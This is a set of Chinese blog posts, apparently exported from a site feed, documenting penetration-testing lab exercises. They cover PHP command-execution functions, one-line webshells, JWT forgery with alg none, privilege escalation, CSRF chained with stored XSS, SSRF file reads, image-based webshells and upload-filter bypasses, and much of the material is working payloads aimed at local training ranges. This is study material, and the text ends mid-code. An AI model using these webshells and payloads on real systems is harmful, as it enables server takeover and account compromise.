class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508281554718.png"></p></li><li><p>passthru()</p><p>执行系统命令，自带回显</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">passthru</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508281556034.png"></p></li><li><p>popen()</p><p>执行系统命令，无回显，需要使用文件读取输出</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">fread</span>(<span class="title function_ invoke__">popen</span>(<span class="variable">$test</span>,<span class="string">&#x27;r&#x27;</span>),<span class="number">10</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508281601537.png"></p></li><li><p>反引号</p><p>&#96;反引号内字符串会被当做系统命令执行，无回显，需要输出</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> `<span class="variable">$test</span>`;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508281605644.png"></p></li></ul><h4 id="②代码执行函数"><a href="#②代码执行函数" class="headerlink" title="②代码执行函数"></a>②代码执行函数</h4><ul><li><p>eval</p><p>将内容当作代码执行，语句需要加 ; </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508281609692.png"></p></li><li><p>assert</p><p>将内容当作代码执行，不需要加 ；，且只能执行单条语句，如echo ‘123’ 无法执行，在高版本已移除这个函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508281614746.png"></p></li><li><p>preg_replace</p><p>这个函数具有一个修饰符e，代表eval，使用这个修饰符时会将第二个参数，也就是待替换的字符串被当作代码执行</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="variable">$data</span>=<span class="string">&quot;Hello, &#123;username&#125;!&quot;</span>;</span><br><span class="line"><span class="variable">$data</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/\&#123;username\&#125;/e&quot;</span>,<span class="variable">$test</span>,<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508281629133.png"></p></li><li><p>call_user_func</p><p>可以调用函数执行</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;test1&#x27;</span>];</span><br><span class="line"><span class="variable">$test2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;test2&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$test1</span>,<span class="variable">$test2</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508281633476.png"></p></li><li><p>array_map</p><p>同call_user_func类似，也能调用函数执行，但第二个参数必须是数组的形式</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;test1&#x27;</span>];</span><br><span class="line"><span class="variable">$test2</span>=<span class="keyword">array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test2&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">array_map</span>(<span class="variable">$test1</span>,<span class="variable">$test2</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508281640698.png"></p></li></ul><h3 id="2、代码执行函数编写一句话木马"><a href="#2、代码执行函数编写一句话木马" class="headerlink" title="2、代码执行函数编写一句话木马"></a>2、代码执行函数编写一句话木马</h3><ul><li><p>assert</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="title function_ invoke__">assert</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508281645178.png"></p></li><li><p>preg_replace</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/a/e&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;real&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;fake&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508281649091.png"></p></li><li><p>call_user_func</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;sys&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508281655317.png"></p></li><li><p>array_map</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="title function_ invoke__">array_map</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>],<span class="keyword">array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sys&#x27;</span>]))<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508281657016.png"></p></li></ul><h3 id="3、JWT伪造"><a href="#3、JWT伪造" class="headerlink" title="3、JWT伪造"></a>3、JWT伪造</h3><p>jwt为json格式的web令牌，分为三部分组成，头部、载荷、签名，可以进行伪造，无加密或者爆破加密密钥</p><h4 id="①pass-4"><a href="#①pass-4" class="headerlink" title="①pass-4"></a>①pass-4</h4><p>访问靶场，点击删除，进行抓包</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508281659032.png"></p><p>提示只有admin有权限重置，并且进行了jwt校验</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508281700315.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508281701930.png"></p><p>将jwt复制下来，发送到jwt.io平台查看jwt的内容，head记录了签名使用的算法，payload记录了用户的身份信息，签名则用于验证信息的合法性</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508281713021.png"></p><p>修改head和payload内容，进行base64编码，当head内容为none时表示未使用算法，所以签名部分为空</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJub25lIn0.eyJpYXQiOjE3NTcyMzU1NjAsImFkbWluIjoidHVyZSIsInVzZXIiOiJUb20ifQ.</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508281717287.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508281716764.png"></p><p>然后重新构造数据包，将jwt更换，然后发送</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508281720247.png"></p><p>成功重置</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508281720248.png"></p><h4 id="②pass-7"><a href="#②pass-7" class="headerlink" title="②pass-7"></a>②pass-7</h4><p>要求具有有效jwt才能进行支付，我们伪造一个用户的jwt，让他帮忙支付</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508281721319.png"></p><p>虽然目前没有jwt，但是可以查看日志，日志里有可能将过期的jwt记录下来</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508281724486.png"></p><p>拿到了一串jwt</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q</span><br></pre></td></tr></table></figure><p>然后去进行伪造，还是同样的方法，将算法设置为none，还需要进行设置时间戳，这里exp代表令牌的结束时间，想要让这个令牌再次生效的话就要更改</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508281725118.png"></p><p>找到一个时间戳生成平台，获取一个较靠后的时间戳</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508281727637.png"></p><p>伪造jwt</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJub25lIn0.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTc1NjM4MDQ0NSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508281729980.png"></p><p>构造请求包发送，这个请求包jwt在Authorization字段</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508281731482.png"></p><h3 id="4、通关pikachu靶场的越权"><a href="#4、通关pikachu靶场的越权" class="headerlink" title="4、通关pikachu靶场的越权"></a>4、通关pikachu靶场的越权</h3><h4 id="①水平越权"><a href="#①水平越权" class="headerlink" title="①水平越权"></a>①水平越权</h4><p>查看个人信息，发现是通过get传参一个用户名查看的</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508281939805.png"></p><p>修改参数为kobe</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508281940109.png"></p><p>成功查看到其他人信息</p><h4 id="②垂直越权"><a href="#②垂直越权" class="headerlink" title="②垂直越权"></a>②垂直越权</h4><p>admin账户有添加功能，和删除功能，并且有专属的url地址</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508281941438.png"></p><p>登录普通用户，去访问添加用户的地址</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.18.175/pikachu-master/vul/overpermission/op2/op2_admin_edit.php</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508281943505.png"></p><p>可以进到添加页面，随意添加一个用户查看</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508281943068.png"></p><p>成功添加</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试-csrf&amp;ssrf&amp;文件包含</title>
      <link href="/2025/08/22/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-csrf&amp;ssrf&amp;%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
      <url>/2025/08/22/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-csrf&amp;ssrf&amp;%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<h3 id="1、csrf漏洞配合存储型XSS组合拳"><a href="#1、csrf漏洞配合存储型XSS组合拳" class="headerlink" title="1、csrf漏洞配合存储型XSS组合拳"></a>1、csrf漏洞配合存储型XSS组合拳</h3><p><strong>核心思想</strong>：攻击者欺骗用户的浏览器，让其以一个已认证用户（登录用户）的身份，向目标网站发送一个非预期的请求。</p><h4 id="①使用admin账号，密码password进入到csrf靶场，发现具有更改密码功能"><a href="#①使用admin账号，密码password进入到csrf靶场，发现具有更改密码功能" class="headerlink" title="①使用admin账号，密码password进入到csrf靶场，发现具有更改密码功能"></a>①使用admin账号，密码password进入到csrf靶场，发现具有更改密码功能</h4><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508271605415.png"></p><h4 id="②进行修改密码，发现是get传参，并且没有验证码校验，直接通过链接发起请求"><a href="#②进行修改密码，发现是get传参，并且没有验证码校验，直接通过链接发起请求" class="headerlink" title="②进行修改密码，发现是get传参，并且没有验证码校验，直接通过链接发起请求"></a>②进行修改密码，发现是get传参，并且没有验证码校验，直接通过链接发起请求</h4><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508271606226.png"></p><h4 id="③将链接保存复制下来，利用标签去自动加载链接达到对修改目标密码的操作，去留言板页面插入xss代码，需配合存储型xss"><a href="#③将链接保存复制下来，利用标签去自动加载链接达到对修改目标密码的操作，去留言板页面插入xss代码，需配合存储型xss" class="headerlink" title="③将链接保存复制下来，利用标签去自动加载链接达到对修改目标密码的操作，去留言板页面插入xss代码，需配合存储型xss"></a>③将链接保存复制下来，利用<img>标签去自动加载链接达到对修改目标密码的操作，去留言板页面插入xss代码，需配合存储型xss</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">payload：&lt;img src=<span class="string">&quot;http://192.168.18.175/DVWA-master/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#&quot;</span> style=<span class="string">&quot;display:none;&quot;</span>&gt;</span><br></pre></td></tr></table></figure><h4 id="④前端对长度进行限制，但是可以修改，然后保存"><a href="#④前端对长度进行限制，但是可以修改，然后保存" class="headerlink" title="④前端对长度进行限制，但是可以修改，然后保存"></a>④前端对长度进行限制，但是可以修改，然后保存</h4><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508271611508.png"></p><h4 id="⑤换一个浏览器，使用另一个账号登录dvwa，账号gordonb，密码abc123，进入后去访问刚才注入xss代码的页面"><a href="#⑤换一个浏览器，使用另一个账号登录dvwa，账号gordonb，密码abc123，进入后去访问刚才注入xss代码的页面" class="headerlink" title="⑤换一个浏览器，使用另一个账号登录dvwa，账号gordonb，密码abc123，进入后去访问刚才注入xss代码的页面"></a>⑤换一个浏览器，使用另一个账号登录dvwa，账号gordonb，密码abc123，进入后去访问刚才注入xss代码的页面</h4><p><img src="C:\Users\thy\AppData\Roaming\Typora\typora-user-images\image-20250827161701576.png" alt="image-20250827161701576"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508271632104.png"></p><h4 id="⑥此时用户已经遭受到攻击，去到admin所在浏览器，退出登录，使用gordonb登录，密码是xss请求的123456"><a href="#⑥此时用户已经遭受到攻击，去到admin所在浏览器，退出登录，使用gordonb登录，密码是xss请求的123456" class="headerlink" title="⑥此时用户已经遭受到攻击，去到admin所在浏览器，退出登录，使用gordonb登录，密码是xss请求的123456"></a>⑥此时用户已经遭受到攻击，去到admin所在浏览器，退出登录，使用gordonb登录，密码是xss请求的123456</h4><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508271634669.png"></p><p>成功登录！！！</p><h3 id="2、ssrf漏洞"><a href="#2、ssrf漏洞" class="headerlink" title="2、ssrf漏洞"></a>2、ssrf漏洞</h3><p><strong>核心思想</strong>：攻击者利用一个Web应用程序的功能，<strong>欺骗后端服务器向任意一个内网或外网地址发起HTTP请求</strong>。攻击的目标不是应用程序本身，而是应用程序所能访问到的<strong>内部系统</strong>或<strong>外部第三方系统</strong>。</p><h4 id="①进入ssrf靶场"><a href="#①进入ssrf靶场" class="headerlink" title="①进入ssrf靶场"></a>①进入ssrf靶场</h4><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508271637307.png"></p><p>url里面存在请求加载某个链接中的文件</p><h4 id="②通过wappalyzer得知是windows操作系统"><a href="#②通过wappalyzer得知是windows操作系统" class="headerlink" title="②通过wappalyzer得知是windows操作系统"></a>②通过wappalyzer得知是windows操作系统</h4><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508271639083.png"></p><h4 id="③读取敏感文件"><a href="#③读取敏感文件" class="headerlink" title="③读取敏感文件"></a>③读取敏感文件</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">windows域名解析地址&quot;C:\Windows\System32\drivers\etc\hosts&quot;</span><br><span class="line">payload：file://C:\\Windows\System32\drivers\etc\hosts</span><br><span class="line">利用file伪协议来读取目标主机本地文件</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508271645820.png"></p><h3 id="3、文件包含漏洞配合图片木马"><a href="#3、文件包含漏洞配合图片木马" class="headerlink" title="3、文件包含漏洞配合图片木马"></a>3、文件包含漏洞配合图片木马</h3><p>Web应用程序在引入（包含）外部文件时，未对用户传入的文件名参数进行充分的验证和过滤，导致攻击者可以操控该参数，让应用程序包含并执行非预期的恶意文件。</p><p>函数：include()  require()  include_once()  require_once()  </p><h4 id="①进入includ靶场，使用本地文件包含靶场"><a href="#①进入includ靶场，使用本地文件包含靶场" class="headerlink" title="①进入includ靶场，使用本地文件包含靶场"></a>①进入includ靶场，使用本地文件包含靶场</h4><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508271650814.png"></p><h4 id="②在自己宿主机制作图片马"><a href="#②在自己宿主机制作图片马" class="headerlink" title="②在自己宿主机制作图片马"></a>②在自己宿主机制作图片马</h4><p>创建一个正常图片png和一个一句话php文件</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508271657649.png"></p><p>命令行执行</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">copy 1.png/b+1.php/a 123.png </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508271700621.png"></p><p>图片马制作完成</p><h4 id="③进行本地包含图片马，假设已经上传上图片马，并且知道路径"><a href="#③进行本地包含图片马，假设已经上传上图片马，并且知道路径" class="headerlink" title="③进行本地包含图片马，假设已经上传上图片马，并且知道路径"></a>③进行本地包含图片马，假设已经上传上图片马，并且知道路径</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload：123.png</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508271806623.png"></p><p>成功解析</p><h3 id="4、文件包含和文件读取的区别"><a href="#4、文件包含和文件读取的区别" class="headerlink" title="4、文件包含和文件读取的区别"></a>4、文件包含和文件读取的区别</h3><h4 id="①文件读取"><a href="#①文件读取" class="headerlink" title="①文件读取"></a>①文件读取</h4><p>编写代码test.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">fgets</span>(<span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>,<span class="string">&#x27;r&#x27;</span>));</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在根目录下保存两个文件123.txt和123.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//123.txt</span></span><br><span class="line">this is file</span><br><span class="line"></span><br><span class="line"><span class="comment">//123.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508271848127.png"></p><p>访问test.php,输入123.txt和123.php</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508271850042.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508271851113.png"></p><p>文件读取是将文件以文本的方式进行打开，并不会将其解析为脚本语言</p><h4 id="②文件包含"><a href="#②文件包含" class="headerlink" title="②文件包含"></a>②文件包含</h4><p>更改代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508271853799.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508271854254.png"></p><p>文件包含会将脚本文件进行解析</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试-文件上传</title>
      <link href="/2025/08/21/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2025/08/21/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h3 id="1、文件上传靶场"><a href="#1、文件上传靶场" class="headerlink" title="1、文件上传靶场"></a>1、文件上传靶场</h3><p>文件上传漏洞的根本原理在于：应用程序未能对用户上传的文件进行充分、有效的安全验证，导致攻击者能够上传并执行恶意文件，从而完全接管服务器。</p><p>简单来说，就是一个本应只上传图片、文档等安全文件的功能，因为缺乏检查，被攻击者利用来上传了“木马后门”程序（如<code>.php</code>, <code>.jsp</code>, <code>.aspx</code>文件）</p><h4 id="①pass-1"><a href="#①pass-1" class="headerlink" title="①pass-1"></a>①pass-1</h4><p>源码</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">checkFile</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.<span class="title function_">substring</span>(file.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.<span class="title function_">indexOf</span>(ext_name + <span class="string">&quot;|&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        <span class="title function_">alert</span>(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是前端js代码，只允许上传jpg、png、gif文件，既然是前端，直接F12操作</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508261601716.png"></p><p>删除return checkfile，然后上传文件</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508261602475.png"></p><p>成功上传！！！点击图片去访问</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508261604045.png"></p><h4 id="②pass-2"><a href="#②pass-2" class="headerlink" title="②pass-2"></a>②pass-2</h4><p>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对上传文件的MIME类型进行了限制，只允许image&#x2F;jpeg，image&#x2F;png、image&#x2F;gif，使用yakit抓包进行上传</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508261613532.png"></p><p>修改Content-Type的内容为image&#x2F;jpeg然后发送包</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508261619261.png"></p><p>访问图片</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508261621685.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508261604045.png"></p><p>成功上传！！！</p><h4 id="③pass-3"><a href="#③pass-3" class="headerlink" title="③pass-3"></a>③pass-3</h4><p>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ 